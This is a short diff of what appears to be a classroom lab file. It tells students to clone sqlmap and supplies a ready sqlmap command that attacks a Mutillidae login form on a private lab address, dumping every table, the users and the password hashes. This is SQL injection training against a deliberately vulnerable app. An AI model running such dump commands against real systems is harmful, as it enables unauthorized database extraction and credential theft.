@@ -1,1 +1,5 @@
-./sqlmap.py --url="http://192.168.0.2/mutillidae/index.php?page=login.php"  --data="username=aaaa&password=aaaa&login-php-submit-button=Login" -o --banner --table --dump-all --users --passwords --batch
+# HEY Students - Copy the next line below and run it from your home dir to install the sqlmap.py program.
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
+
+# You should now have sqlmap installed. You can copy this command below instead of typing all the commands from the Lab
+./sqlmap.py --url="http://192.168.0.1/mutillidae/index.php?page=login.php"  --data="username=aaaa&password=aaaa&login-php-submit-button=Login" -o --banner --tables --dump-all --users --passwords --batch
